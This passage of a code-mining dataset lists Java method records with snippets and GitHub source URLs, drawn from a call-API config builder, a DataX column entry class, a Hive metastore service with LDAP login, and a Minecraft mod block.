(!baseUrl.endsWith(\"/\")){                baseUrl += \"/\";            }            if (baseUrl.endsWith(\"/rocket/\")){                baseUrl = baseUrl.replace(\"/rocket\", \"\");            }        }        return baseUrl;    }", "url": "https://raw.githubusercontent.com/pengfeigao/AgoraCallApi/master/call-plugin-api/src/main/java/com/basetools/net/config/CallConfig.java", "stars": "1", "class": {"name": "CallConfig", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getToken", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getToken() {        return token;    }", "url": "https://raw.githubusercontent.com/pengfeigao/AgoraCallApi/master/call-plugin-api/src/main/java/com/basetools/net/config/CallConfig.java", "stars": "1", "class": {"name": "CallConfig", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "isDebugEnable", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean isDebugEnable() {        return debugEnable;    }", "url": "https://raw.githubusercontent.com/pengfeigao/AgoraCallApi/master/call-plugin-api/src/main/java/com/basetools/net/config/CallConfig.java", "stars": "1", "class": {"name": "CallConfig", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getPlatformJson", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getPlatformJson() {        return platformJson;    }", "url": "https://raw.githubusercontent.com/pengfeigao/AgoraCallApi/master/call-plugin-api/src/main/java/com/basetools/net/config/CallConfig.java", "stars": "1", "class": {"name": "CallConfig", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "isGlobal", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean isGlobal() {        return global;    }", "url": "https://raw.githubusercontent.com/pengfeigao/AgoraCallApi/master/call-plugin-api/src/main/java/com/basetools/net/config/CallConfig.java", "stars": "1", "class": {"name": "CallConfig", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "isFixHeartbeatApi", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean isFixHeartbeatApi() {        return fixHeartbeatApi;    }", "url": "https://raw.githubusercontent.com/pengfeigao/AgoraCallApi/master/call-plugin-api/src/main/java/com/basetools/net/config/CallConfig.java", "stars": "1", "class": {"name": "CallConfig", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setBaseUrl", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "Builder", "snippet": "        public Builder setBaseUrl(String baseUrl) {            this.baseUrl = baseUrl;            return this;        }", "url": "https://raw.githubusercontent.com/pengfeigao/AgoraCallApi/master/call-plugin-api/src/main/java/com/basetools/net/config/CallConfig.java", "stars": "1", "class": {"name": "Builder", "extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "setToken", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "Builder", "snippet": "        public Builder setToken(String token) {            this.token = token;            return this;        }", "url": "https://raw.githubusercontent.com/pengfeigao/AgoraCallApi/master/call-plugin-api/src/main/java/com/basetools/net/config/CallConfig.java", "stars": "1", "class": {"name": "Builder", "extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "setDebugEnable", "params": ["boolean"], "throws": null, "modifiers": ["public"], "return_type": "Builder", "snippet": "        public Builder setDebugEnable(boolean debugEnable) {            this.debugEnable = debugEnable;            return this;        }", "url": "https://raw.githubusercontent.com/pengfeigao/AgoraCallApi/master/call-plugin-api/src/main/java/com/basetools/net/config/CallConfig.java", "stars": "1", "class": {"name": "Builder", "extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "setPlatformJson", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "Builder", "snippet": "        public Builder setPlatformJson(String platformJson) {            this.platformJson = platformJson;            return this;        }", "url": "https://raw.githubusercontent.com/pengfeigao/AgoraCallApi/master/call-plugin-api/src/main/java/com/basetools/net/config/CallConfig.java", "stars": "1", "class": {"name": "Builder", "extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "setGlobal", "params": ["boolean"], "throws": null, "modifiers": ["public"], "return_type": "Builder", "snippet": "        public Builder setGlobal(boolean global) {            this.global = global;            return this;        }", "url": "https://raw.githubusercontent.com/pengfeigao/AgoraCallApi/master/call-plugin-api/src/main/java/com/basetools/net/config/CallConfig.java", "stars": "1", "class": {"name": "Builder", "extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "setFixHeartbeatApi", "params": ["boolean"], "throws": null, "modifiers": ["public"], "return_type": "Builder", "snippet": "        public Builder setFixHeartbeatApi(boolean fixHeartbeatApi){            this.fixHeartbeatApi = fixHeartbeatApi;            return this;        }", "url": "https://raw.githubusercontent.com/pengfeigao/AgoraCallApi/master/call-plugin-api/src/main/java/com/basetools/net/config/CallConfig.java", "stars": "1", "class": {"name": "Builder", "extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "build", "params": [], "throws": null, "modifiers": ["public"], "return_type": "CallConfig", "snippet": "        public CallConfig build(){            return new CallConfig(baseUrl, token, platformJson, global, debugEnable, fixHeartbeatApi);        }", "url": "https://raw.githubusercontent.com/pengfeigao/AgoraCallApi/master/call-plugin-api/src/main/java/com/basetools/net/config/CallConfig.java", "stars": "1", "class": {"name": "Builder", "extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "getIndex", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Integer", "snippet": "    public Integer getIndex() {        return index;    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/plugin/unstructuredstorage/reader/ColumnEntry.java", "stars": "23", "class": {"name": "ColumnEntry", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setIndex", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setIndex(Integer index) {        this.index = index;    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/plugin/unstructuredstorage/reader/ColumnEntry.java", "stars": "23", "class": {"name": "ColumnEntry", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getType", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getType() {        return type;    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/plugin/unstructuredstorage/reader/ColumnEntry.java", "stars": "23", "class": {"name": "ColumnEntry", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setType", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setType(String type) {        this.type = type;    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/plugin/unstructuredstorage/reader/ColumnEntry.java", "stars": "23", "class": {"name": "ColumnEntry", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getValue", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getValue() {        return value;    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/plugin/unstructuredstorage/reader/ColumnEntry.java", "stars": "23", "class": {"name": "ColumnEntry", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setValue", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setValue(String value) {        this.value = value;    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/plugin/unstructuredstorage/reader/ColumnEntry.java", "stars": "23", "class": {"name": "ColumnEntry", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getFormat", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getFormat() {        return format;    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/plugin/unstructuredstorage/reader/ColumnEntry.java", "stars": "23", "class": {"name": "ColumnEntry", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setFormat", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setFormat(String format) {        this.format = format;        if (StringUtils.isNotBlank(this.format)) {            this.dateParse = new SimpleDateFormat(this.format);        }    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/plugin/unstructuredstorage/reader/ColumnEntry.java", "stars": "23", "class": {"name": "ColumnEntry", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getDateFormat", "params": [], "throws": null, "modifiers": ["public"], "return_type": "DateFormat", "snippet": "    public DateFormat getDateFormat() {        return this.dateParse;    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/plugin/unstructuredstorage/reader/ColumnEntry.java", "stars": "23", "class": {"name": "ColumnEntry", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "toJSONString", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String toJSONString() {        return ColumnEntry.toJSONString(this);    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/plugin/unstructuredstorage/reader/ColumnEntry.java", "stars": "23", "class": {"name": "ColumnEntry", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "toJSONString", "params": ["ColumnEntry"], "throws": null, "modifiers": ["public", "static"], "return_type": "String", "snippet": "    public static String toJSONString(ColumnEntry columnEntry) {        return JSON.toJSONString(columnEntry);    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/plugin/unstructuredstorage/reader/ColumnEntry.java", "stars": "23", "class": {"name": "ColumnEntry", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getDatasourceById", "params": ["String"], "throws": null, "modifiers": ["protected"], "return_type": "DataSource", "snippet": "    protected DataSource getDatasourceById(String dsId) {        DataSource ds = dataSourceService.getDetail(dsId);        if(!ds.getSourceType().toLowerCase().equals(TypeEnums.HIVE.v())){            LOG.error(\"Data source id: \"+ dsId +\", type:\"+ds.getSourceType() +\", is not hive\");            throw new EndPointException(\"exchange.hive_meta.invalid.data_source.id\", null, dsId);        }        ds.resolveParams();        return ds;    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/datasource/service/impl/HiveMetaDbServiceImpl.java", "stars": "23", "class": {"name": "HiveMetaDbServiceImpl", "extends": "AbstractMetaDbService", "implements": ["HiveMetaDbService"], "modifiers": ["public"]}}, {"method_name": "getDBConnection", "params": ["DataSource", "File"], "throws": null, "modifiers": ["protected"], "return_type": "Hive", "snippet": "    protected Hive getDBConnection(DataSource ds, File keytab){        try {            return HiveMeta.getClient(ds.getParameterMap(), keytab, configuration.getKbPrincipleHive());        }catch(Exception e){            LOG.error(\"Get Hive MetaStore connection failed, message: \" +e.getMessage(), e);            throw new EndPointException(\"exchange.hive_meta.connect.error\", e);        }    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/datasource/service/impl/HiveMetaDbServiceImpl.java", "stars": "23", "class": {"name": "HiveMetaDbServiceImpl", "extends": "AbstractMetaDbService", "implements": ["HiveMetaDbService"], "modifiers": ["public"]}}, {"method_name": "isConnLock", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "boolean", "snippet": "    protected boolean isConnLock() {        return true;    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/datasource/service/impl/HiveMetaDbServiceImpl.java", "stars": "23", "class": {"name": "HiveMetaDbServiceImpl", "extends": "AbstractMetaDbService", "implements": ["HiveMetaDbService"], "modifiers": ["public"]}}, {"method_name": "getDBConnection", "params": ["DataSource"], "throws": null, "modifiers": ["protected"], "return_type": "Hive", "snippet": "    protected Hive getDBConnection(DataSource ds){        try {            String userName = String.valueOf(ds.getParameterMap().getOrDefault(PARAM_LADP_USERNAME, \"\"));            if(StringUtils.isNotBlank(userName)) {                String password =  String.valueOf(CryptoUtils.string2Object(                        String.valueOf(ds.getParameterMap().getOrDefault(PARAM_LADP_PASSWORD, \"\"))));                if (configuration.isLdapSwitch()) {                    LdapConnector connector = LdapConnector.getInstance(configuration.getLdapUrl(), configuration.getLdapBaseDn());                    if (!connector.authenticate(userName, password)) {                        throw new RuntimeException(\"LDAP Authenticate failed\");                    }                } else {                    throw new RuntimeException(\"LDAP module does not be opened\");                }            }            return HiveMeta.getClient(ds.getParameterMap(), userName);        }catch(Exception e){            LOG.error(\"Get Hive MetaStore connection failed, message: \" + e.getMessage(), e);            throw new EndPointException(\"exchange.hive_meta.connect.error\", e);        }    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/datasource/service/impl/HiveMetaDbServiceImpl.java", "stars": "23", "class": {"name": "HiveMetaDbServiceImpl", "extends": "AbstractMetaDbService", "implements": ["HiveMetaDbService"], "modifiers": ["public"]}}, {"method_name": "getDatabases0", "params": ["Hive"], "throws": null, "modifiers": ["public"], "return_type": "List<String>", "snippet": "    public List<String> getDatabases0(Hive hive) {        try {            return hive.getAllDatabases();        } catch (HiveException e) {            LOG.error(\"Get Hive databases error, message: \" + e.getMessage(), e);            throw new EndPointException(\"exchange.hive_meta.obtain.database.error\", e);        }    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/datasource/service/impl/HiveMetaDbServiceImpl.java", "stars": "23", "class": {"name": "HiveMetaDbServiceImpl", "extends": "AbstractMetaDbService", "implements": ["HiveMetaDbService"], "modifiers": ["public"]}}, {"method_name": "getTables0", "params": ["Hive", "String"], "throws": null, "modifiers": ["public"], "return_type": "List<String>", "snippet": "    public List<String> getTables0(Hive hive, String database) {        try {             return hive.getAllTables(database);        } catch (HiveException e) {            LOG.error(\"Get Hive tables error, database: \"+ database +\", message: \" + e.getMessage(), e);            throw new EndPointException(\"exchange.hive_meta.get.table.failed\",database, e);        }    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/datasource/service/impl/HiveMetaDbServiceImpl.java", "stars": "23", "class": {"name": "HiveMetaDbServiceImpl", "extends": "AbstractMetaDbService", "implements": ["HiveMetaDbService"], "modifiers": ["public"]}}, {"method_name": "getPartitions0", "params": ["Hive", "String", "String"], "throws": null, "modifiers": ["public"], "return_type": "MetaPartitionInfo", "snippet": "    public MetaPartitionInfo getPartitions0(Hive hive, String database, String table) {        List<Partition> partitions;        Table table1;        try {            table1 = hive.getTable(database, table);            partitions = hive.getPartitions(hive.getTable(database, table));        } catch (HiveException e) {            LOG.error(\"Get Hive partitions error, database: \" + database                    + \", table: \" +table+\", message: \" + e.getMessage(), e);            throw new EndPointException(\"exchange.hive_meta.get.information.failed\", e,database,table);        }        MetaPartitionInfo info = new MetaPartitionInfo();        List<FieldSchema> partitionKeys = table1.getPartitionKeys();        List<String> partKeys = new ArrayList<>();        partitionKeys.forEach(e -> partKeys.add(e.getName()));        info.setPartKeys(partKeys);        //Static partitions        Map<String, MetaPartitionInfo.PartitionNode> pMap = new HashMap<>(20);        MetaPartitionInfo.PartitionNode root = new MetaPartitionInfo.PartitionNode();        info.setRoot(root);        LOG.info(\"Get partitions: database {}, table {}\" , database, table);        long t = System.currentTimeMillis();        for(Partition p : partitions){            try {                List<String> values = p.getValues();                LOG.info(\"Get partitions: database {}, table {}, p {}, value {} \" , database, table, p.getName(), Json.toJson(values, String.class));                if(!partitionKeys.isEmpty()){                    String parentNameValue = \"\";                    for(int i = 0; i < values.size(); i++){                        FieldSchema fieldSchema = partitionKeys.get(i);                        String name = fieldSchema.getName();                        String value = values.get(i);                        String nameValue= name + \"=\" + value;                        MetaPartitionInfo.PartitionNode node = new MetaPartitionInfo.PartitionNode();                        if(i > 0){                            MetaPartitionInfo.PartitionNode parent = pMap.get(parentNameValue);                            parent.setName(name);                            parent.getPartitions().putIfAbsent(value, node);                        }else{                            root.setName(name);                            root.getPartitions().putIfAbsent(value, node);                        }                        parentNameValue += \"/\" + nameValue;                        pMap.putIfAbsent(parentNameValue, node);                    }                }            }catch(Exception e){                LOG.info(e.getLocalizedMessage());            }        }        LOG.info(\"Tree Build cost: {}\", System.currentTimeMillis() - t);        return info;    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/datasource/service/impl/HiveMetaDbServiceImpl.java", "stars": "23", "class": {"name": "HiveMetaDbServiceImpl", "extends": "AbstractMetaDbService", "implements": ["HiveMetaDbService"], "modifiers": ["public"]}}, {"method_name": "getPartitionKeys", "params": ["String", "String", "String"], "throws": null, "modifiers": ["public"], "return_type": "MetaPartitionInfo", "snippet": "    public MetaPartitionInfo getPartitionKeys(String dsId, String database, String table) {        return this.getConnAndRun(dsId , hive ->{            Table rawTable = getRawTable(dsId, database, table);            List<FieldSchema> partitionKeys = rawTable.getPartitionKeys();            List<String> partKeys = new ArrayList<>();            partitionKeys.forEach(e -> partKeys.add(e.getName()));            MetaPartitionInfo info = new MetaPartitionInfo();            info.setPartKeys(partKeys);            MetaPartitionInfo.PartitionNode root = new MetaPartitionInfo.PartitionNode();            info.setRoot(root);            return info;        });    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/datasource/service/impl/HiveMetaDbServiceImpl.java", "stars": "23", "class": {"name": "HiveMetaDbServiceImpl", "extends": "AbstractMetaDbService", "implements": ["HiveMetaDbService"], "modifiers": ["public"]}}, {"method_name": "getColumns0", "params": ["Hive", "String", "String"], "throws": null, "modifiers": ["public"], "return_type": "List<MetaColumnInfo>", "snippet": "    public List<MetaColumnInfo> getColumns0(Hive hive, String database, String table) {        List<MetaColumnInfo> metaInfos = new ArrayList<>();        Table tb;        try {            tb = hive.getTable(database, table);        } catch (HiveException e) {            LOG.error(\"Get Hive table error, database: \" + database                    + \", table: \" +table+\", message: \" + e.getMessage(), e);            throw new EndPointException(\"exchange.hive_meta.obtain.information.failed\", e,database,table);        }        if(tb.getTableType() == TableType.VIRTUAL_VIEW){            throw new EndPointException(\"exchange.hive_meta.is.view.table\", null,database,table);        }        for(StructField field : tb.getFields()){            MetaColumnInfo metaColumnInfo = new MetaColumnInfo();            metaColumnInfo.setIndex(field.getFieldID());            metaColumnInfo.setName(field.getFieldName());            metaColumnInfo.setType(field.getFieldObjectInspector().getTypeName());            metaInfos.add(metaColumnInfo);        }        return metaInfos;    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/datasource/service/impl/HiveMetaDbServiceImpl.java", "stars": "23", "class": {"name": "HiveMetaDbServiceImpl", "extends": "AbstractMetaDbService", "implements": ["HiveMetaDbService"], "modifiers": ["public"]}}, {"method_name": "getPath", "params": ["String", "String", "String"], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getPath(String dsId, String database, String table) {        return super.getConnAndRun(dsId, hive ->{            try{                Table tb = hive.getTable(database, table);                return tb.getPath().toUri().getPath();            }catch(HiveException e){                LOG.error(\"Get Hive table path error, database: \" + database                        + \", table: \" +table+\", message: \" + e.getMessage(), e);                throw new EndPointException(\"exchage.hive_meta.get.tablepath.failed\", e,database,table);            }        });    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/datasource/service/impl/HiveMetaDbServiceImpl.java", "stars": "23", "class": {"name": "HiveMetaDbServiceImpl", "extends": "AbstractMetaDbService", "implements": ["HiveMetaDbService"], "modifiers": ["public"]}}, {"method_name": "getMetaStore", "params": ["String", "String", "String"], "throws": null, "modifiers": ["public"], "return_type": "Properties", "snippet": "    public Properties getMetaStore(String dsId, String database, String table) {        return super.getConnAndRun(dsId, conn -> this.getMetaStore0(conn, database, table));    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/datasource/service/impl/HiveMetaDbServiceImpl.java", "stars": "23", "class": {"name": "HiveMetaDbServiceImpl", "extends": "AbstractMetaDbService", "implements": ["HiveMetaDbService"], "modifiers": ["public"]}}, {"method_name": "getMetaStore", "params": ["DataSource", "String", "String"], "throws": null, "modifiers": ["public"], "return_type": "Properties", "snippet": "    public Properties getMetaStore(DataSource ds, String database, String table) {        if(ds.getId() > 0){            return this.getMetaStore(String.valueOf(ds.getId()), database, table);        }        return super.getConnAndRun(ds, conn -> this.getMetaStore0(conn, database, table));    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/datasource/service/impl/HiveMetaDbServiceImpl.java", "stars": "23", "class": {"name": "HiveMetaDbServiceImpl", "extends": "AbstractMetaDbService", "implements": ["HiveMetaDbService"], "modifiers": ["public"]}}, {"method_name": "getMetaStore", "params": ["String", "String", "String", "Map<String,String>"], "throws": null, "modifiers": ["public"], "return_type": "Properties", "snippet": "    public Properties getMetaStore(String dsId, String database, String table, Map<String, String> partSpec) {        return super.getConnAndRun(dsId, conn -> this.getMetaStore0(conn, database, table, partSpec));    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/datasource/service/impl/HiveMetaDbServiceImpl.java", "stars": "23", "class": {"name": "HiveMetaDbServiceImpl", "extends": "AbstractMetaDbService", "implements": ["HiveMetaDbService"], "modifiers": ["public"]}}, {"method_name": "getMetaStore", "params": ["DataSource", "String", "String", "Map<String,String>"], "throws": null, "modifiers": ["public"], "return_type": "Properties", "snippet": "    public Properties getMetaStore(DataSource ds, String database, String table, Map<String, String> partSpec) {        if(ds.getId() > 0){            return this.getMetaStore(String.valueOf(ds.getId()), database, table, partSpec);        }        return super.getConnAndRun(ds, conn -> this.getMetaStore0(conn, database, table, partSpec));    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/datasource/service/impl/HiveMetaDbServiceImpl.java", "stars": "23", "class": {"name": "HiveMetaDbServiceImpl", "extends": "AbstractMetaDbService", "implements": ["HiveMetaDbService"], "modifiers": ["public"]}}, {"method_name": "isView", "params": ["String", "String", "String"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean isView(String dsId, String database, String table) {        return super.getConnAndRun(dsId, conn -> this.isView0(conn, database, table));    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/datasource/service/impl/HiveMetaDbServiceImpl.java", "stars": "23", "class": {"name": "HiveMetaDbServiceImpl", "extends": "AbstractMetaDbService", "implements": ["HiveMetaDbService"], "modifiers": ["public"]}}, {"method_name": "isView", "params": ["DataSource", "String", "String"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean isView(DataSource ds, String database, String table) {        if(ds.getId() > 0){            return this.isView(String.valueOf(ds.getId()), database, table);        }        return super.getConnAndRun(ds, conn -> this.isView0(conn, database, table));    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/datasource/service/impl/HiveMetaDbServiceImpl.java", "stars": "23", "class": {"name": "HiveMetaDbServiceImpl", "extends": "AbstractMetaDbService", "implements": ["HiveMetaDbService"], "modifiers": ["public"]}}, {"method_name": "getRawTable", "params": ["String", "String", "String"], "throws": null, "modifiers": ["public"], "return_type": "Table", "snippet": "    public Table getRawTable(String dsId, String database, String table) {        return super.getConnAndRun(dsId, conn -> this.getRawTable0(conn, database, table));    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/datasource/service/impl/HiveMetaDbServiceImpl.java", "stars": "23", "class": {"name": "HiveMetaDbServiceImpl", "extends": "AbstractMetaDbService", "implements": ["HiveMetaDbService"], "modifiers": ["public"]}}, {"method_name": "getRawTable", "params": ["DataSource", "String", "String"], "throws": null, "modifiers": ["public"], "return_type": "Table", "snippet": "    public Table getRawTable(DataSource ds, String database, String table) {        if(ds.getId() > 0){            return this.getRawTable(String.valueOf(ds.getId()), database, table);        }        return super.getConnAndRun(ds, conn -> this.getRawTable0(conn, database, table));    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/datasource/service/impl/HiveMetaDbServiceImpl.java", "stars": "23", "class": {"name": "HiveMetaDbServiceImpl", "extends": "AbstractMetaDbService", "implements": ["HiveMetaDbService"], "modifiers": ["public"]}}, {"method_name": "getMetaStore0", "params": ["Hive", "String", "String"], "throws": null, "modifiers": ["private"], "return_type": "Properties", "snippet": "    private Properties getMetaStore0(Hive hive, String database, String table){        Table table0 = getRawTable0(hive, database, table);        return table0.getMetadata();    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/datasource/service/impl/HiveMetaDbServiceImpl.java", "stars": "23", "class": {"name": "HiveMetaDbServiceImpl", "extends": "AbstractMetaDbService", "implements": ["HiveMetaDbService"], "modifiers": ["public"]}}, {"method_name": "getMetaStore0", "params": ["Hive", "String", "String", "Map<String,String>"], "throws": null, "modifiers": ["private"], "return_type": "Properties", "snippet": "    private Properties getMetaStore0(Hive hive, String database, String table, Map<String, String> partSpec){        Table table0 = getRawTable0(hive, database ,table);        Partition partition =  getPartition0(hive, table0, partSpec);        if(null != partition){            return partition.getMetadataFromPartitionSchema();        }        return null;    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/datasource/service/impl/HiveMetaDbServiceImpl.java", "stars": "23", "class": {"name": "HiveMetaDbServiceImpl", "extends": "AbstractMetaDbService", "implements": ["HiveMetaDbService"], "modifiers": ["public"]}}, {"method_name": "isView0", "params": ["Hive", "String", "String"], "throws": null, "modifiers": ["private"], "return_type": "boolean", "snippet": "    private boolean isView0(Hive hive, String database, String table){            Table table0 = getRawTable0(hive, database, table);            return table0.getTableType() == TableType.VIRTUAL_VIEW;    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/datasource/service/impl/HiveMetaDbServiceImpl.java", "stars": "23", "class": {"name": "HiveMetaDbServiceImpl", "extends": "AbstractMetaDbService", "implements": ["HiveMetaDbService"], "modifiers": ["public"]}}, {"method_name": "getRawTable0", "params": ["Hive", "String", "String"], "throws": null, "modifiers": ["private"], "return_type": "Table", "snippet": "    private Table getRawTable0(Hive hive, String database, String table){        try{            return hive.getTable(database, table);        }catch(HiveException e){            LOG.error(\"Get Hive table error, database: \" + database                    + \", table: \" +table+\", message: \" + e.getMessage(), e);            throw new EndPointException(\"exchange.hive_meta.obtain.information.failed\", e,database,table);        }    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/datasource/service/impl/HiveMetaDbServiceImpl.java", "stars": "23", "class": {"name": "HiveMetaDbServiceImpl", "extends": "AbstractMetaDbService", "implements": ["HiveMetaDbService"], "modifiers": ["public"]}}, {"method_name": "getPartition0", "params": ["Hive", "Table", "Map<String,String>"], "throws": null, "modifiers": ["private"], "return_type": "Partition", "snippet": "    private Partition getPartition0(Hive hive, Table table, Map<String, String> partSpec){        try{            return hive.getPartition(table, partSpec, false);        }catch(HiveException e){            LOG.error(\"Get Hive partition error, database: \" + table.getDbName()                + \", table: \" + table.getTableName() + \", message: \" + e.getMessage() + \", partSpec: \"                    + Json.toJson(partSpec, null), e);            throw new EndPointException(\"exchange.hive_meta.get.partition_info.failed\", e,table.getDbName(),table.getTableName(),partSpec);        }    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/datasource/service/impl/HiveMetaDbServiceImpl.java", "stars": "23", "class": {"name": "HiveMetaDbServiceImpl", "extends": "AbstractMetaDbService", "implements": ["HiveMetaDbService"], "modifiers": ["public"]}}, {"method_name": "initElements", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void initElements() {\t\telements.blocks.add(() -> new CustomBlock());\t\telements.items.add(() -> new BlockItem(block, new Item.Properties().group(null)).setRegistryName(block.getRegistryName()));\t}", "url": "https://raw.githubusercontent.com/KarogathModdingStudios/Enhanced-Vanilla-1.15/master/src/main/java/com/karogath/enhancedvanilla/block/PottedSyringaBlock.java", "stars": "2", "class": {"name": "PottedSyringaBlock", "extends": "EnhancedVanillaElements", "implements": null, "modifiers": ["public"]}}, {"method_name": "clientLoad", "params": ["FMLClientSetupEvent"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void clientLoad(FMLClientSetupEvent event) {\t\tRenderTypeLookup.setRenderLayer(block, RenderType.getCutout());\t}", "url": 